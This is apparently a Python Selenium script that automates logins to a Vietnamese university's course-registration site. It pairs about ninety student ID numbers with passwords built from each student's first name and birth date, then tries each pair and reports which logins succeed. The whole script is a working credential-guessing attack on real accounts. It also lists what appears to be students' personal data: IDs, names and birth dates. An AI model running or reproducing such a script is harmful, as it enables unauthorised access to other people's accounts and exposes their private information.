from selenium import webdriver
import array as arr
from time import sleep
from selenium.webdriver.common.keys import Keys

# def login():
browser = webdriver.Chrome(
    executable_path="C:\Program Files\Google\Chrome\Application\chromedriver.exe")

msv = ["20020277", 
"20020278", "20021282", "20021284",
         "20020279", "20020127", "20020128",
         "20020280", "20021287","20021286",
         "20020281", "20020074", "20021292", 
         "20021295", "20020130", "20020131",
         "20020282", "20020283", "20020284",
         "20020285", "20020076", "20020286",
         "20020287",
         "20021319",
         "20021320",
         "20020274",
         "20020289",
         "20021324",
         "20021327",
         "20021328",
         "20021329",
         "20020290",
         "20021332",
         "20020291",
         "20020132",
         "20021337",
         "20020222",
         "20020133",
         "20020134",
         "20021347",
         "20020293",
         "20020135",
         "20021356",
         "20020136",
         "20020137",
         "20020015",
         "20021363",
         "20020078",
         "20020016",
         "20020294",
         "20020295",
         "20020139",
         "20020185",
         "20020296",
         "20020141",
         "20020079",
         "20020142",
         "20020145",
         "20020301",
         "20020302",
         "20020147",
         "20020223",
         "20021400",
         "20020303",
         "20020304",
         "20020305",
         "20020306",
         "20020307",
         "20020308",
         "20020309",
         "20021415",
         "20021416",
         "20021418",
         "20020310",
         "20020082",
         "20021429",
         "20020029",
         "20020312",
         "20021435",
         "20021440",
         "20020313",
         "20021444",
         "20021449",
         "20021454",
         "20020238",
         "20021608",
         "20020269",
         "20021469",
         "20021472",
         "20020314"]

ten = [ "an",
"an",
"an"
,"anh"
,"anh"
,"kieuanh"
,"anh"
,"anh"
,"anh"
,"anh"
,"anh"
,"anh"
,"anh"
,"anh"
,"bao"
,"cuong"
,"cuong"
,"cuong"
,"dung"
,"dung"
,"dung"
,"dung"
,"duy"
,"duy"
,"duong"
,"anhduong"
,"dat"
,"dat"
,"dat"
,"dat"
,"dang"
,"do"
,"duc"
,"duc"
,"duc"
,"duc"
,"ha"
,"hai"
,"hang"
,"hien"
,"hien"
,"hieu"
,"hieu"
,"hieu"
,"hieu"
,"tuanhoang"
,"hop"
,"hung"
,"huy"
,"huy"
,"huynh"
,"hung"
,"khanh"
,"khanh"
,"giakhanh"
,"khiem"
,"kien"
,"loc"
,"minh"
,"tuanminh"
,"minh"
,"tramy"
,"nghia"
,"nghia"
,"nguyen"
,"nhan"
,"quang"
,"quang"
,"quang"
,"quan"
,"quan"
,"anhquan"
,"quy"
,"quy"
,"quyet"
,"son"
,"tan"
,"thanh"
,"thanh"
,"thang"
,"thi"
,"thinh"
,"tien"
,"trang"
,"viettruong"
,"tuan"
,"tuan"
,"tung"
,"tung"
,"vuong"]


ngaysinh = ["23122002",
"16102002",
"14022002",
"18112002",
"27042002",
"02122002",
"19022002",
"14122002",
"15052002",
"25012002",
"19062002",
"14032002",
"28112002",
"10092002",
"27092002",
"26012002",
"23072002",
"30042002",
"08092002",
"19082002",
"06012002",
"29052002",
"25072002",
"25012002",
"07122002",
"10052002",
"11032002",
"09072002",
"06022002",
"02102002",
"05052002",
"24092002",
"10032002",
"15112002",
"03092002",
"01122002",
"18092002",
"03112002",
"26112002",
"20122002",
"11092002",
"11052002",
"12122002",
"12112002",
"29072002",
"22042002",
"11052002",
"16072002",
"26022002",
"18092002",
"18042002",
"20112002",
"24032002",
"07052002",
"25072002",
"15112002",
"10032002",
"14052002",
"24122002",
"08112002",
"18112002",
"02072002",
"08112002",
"07122002",
"13052002",
"20032002",
"22102002",
"06092002",
"29082002",
"29112002",
"01122002",
"24022002",
"24032002",
"08052002",
"15012002",
"20042002",
"04072002",
"15122002",
"28012002",
"20082002",
"19012002",
"06072002",
"13052002",
"26102002",
"12012002",
"01012001",
"30012002",
"15082002",
"26012002",
"12082002",
]

for i in range(0, len(msv)):
    print(msv[i])
    user = msv[i]
    passw =  ten[i] + ngaysinh[i]
    print(passw)

    browser.get("http://dangkyhoc.vnu.edu.vn/dang-nhap")

    txtUser = browser.find_element_by_id("LoginName")
    txtUser.send_keys(user)

    txtPass = browser.find_element_by_id("Password")
    txtPass.send_keys(passw)
    txtPass.send_keys(Keys.ENTER)

    try:
        browser.find_element_by_class_name('icon-stackexchange')
        print("Login Success")
        sleep(5)

    except Exception as e:
        print(e)
        print("Login Failed")

sleep(5)
browser.close()
